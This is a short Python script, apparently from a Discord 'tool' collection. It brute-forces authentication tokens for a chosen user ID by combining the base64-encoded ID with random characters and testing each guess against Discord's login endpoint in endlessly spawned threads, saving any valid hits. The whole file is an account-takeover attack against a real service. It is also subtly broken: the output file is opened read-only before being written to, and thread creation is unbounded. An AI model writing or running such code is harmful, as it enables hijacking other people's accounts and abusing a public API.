import base64
import random
import string
import sys
from colorama import Fore
import requests
import threading

def main():
        print(Fore.CYAN + 'Start Token Brute Forcing\n\n')

        targetID = base64.b64encode((input(Fore.CYAN + 'ID of User: ')).encode("ascii"))
        targetID = str(targetID)[2:-1]

        def bruteforece():
            while targetID == targetID:
                token = targetID + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} VALID' + ' ' + token)
                        f = open('util/bruteforced.txt')
                        f.write(f'{token}\n')
                    else:
                        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} INVALID' + ' ' + token)
                finally:
                    print('')

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()

        sys.exit(input('[>]Token hitted! (kind of lucky ngl)\n[>]Press enter: ')) 